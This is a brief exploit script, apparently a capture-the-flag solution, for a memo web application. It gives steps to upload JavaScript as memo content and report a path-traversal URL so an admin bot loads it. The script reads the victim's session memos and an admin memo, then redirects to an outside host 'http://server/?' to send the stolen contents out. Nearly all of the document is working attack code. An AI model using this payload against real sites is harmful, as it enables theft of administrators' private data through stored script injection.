// Exploit!
// 1. Login with any username e.g. herewego
// 2. upload script below as memo content with title script.js

(async () => {
	const json = (await (await fetch('/memo/session')).json())
	const flag = (await (await fetch('/memo/admin/' + json.memos[0])).text())
	location='http://server/?'+flag
})()

// 3. report an url like http://site-host/memo/herewego//..%2F
// done! http://server/? will receive memo id, and you can get flag by accessing http://site-host/memo/admin/<memo-id>